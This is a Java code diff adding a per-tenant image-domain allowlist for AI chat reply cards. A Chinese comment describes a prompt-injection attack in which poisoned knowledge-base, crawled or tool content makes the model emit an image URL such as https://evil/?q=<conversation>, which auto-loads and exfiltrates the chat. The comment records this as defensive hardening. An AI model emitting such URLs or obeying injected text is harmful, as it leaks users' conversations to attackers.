@@ -97,6 +97,17 @@ public class Application {
     private String allowedOrigins;
 
     /**
+     * AI 回复卡片里的图片允许自动加载的域名（逗号分隔，支持 {@code *.example.com}）。为空表示一律不自动加载，
+     * 只显示为可点击的链接。
+     *
+     * <p>2026-09-30 安全审查 M7：卡片 image 节点的地址由模型生成，而模型可被知识库 / 爬取页面 / 工具返回里的
+     * 提示注入操纵——让它输出 {@code https://evil/?q=<对话内容>} 的图片，访客的挂件或坐席的工作台一打开就自动
+     * 请求、把对话外带出去。白名单只放行租户自己信得过的图床。
+     */
+    @Column(name = "image_allowed_domains", columnDefinition = "TEXT")
+    private String imageAllowedDomains;
+
+    /**
      * Webhook 回调 URL。为空表示未启用 Webhook 事件推送。
      */
     @Column(name = "webhook_url", columnDefinition = "TEXT")
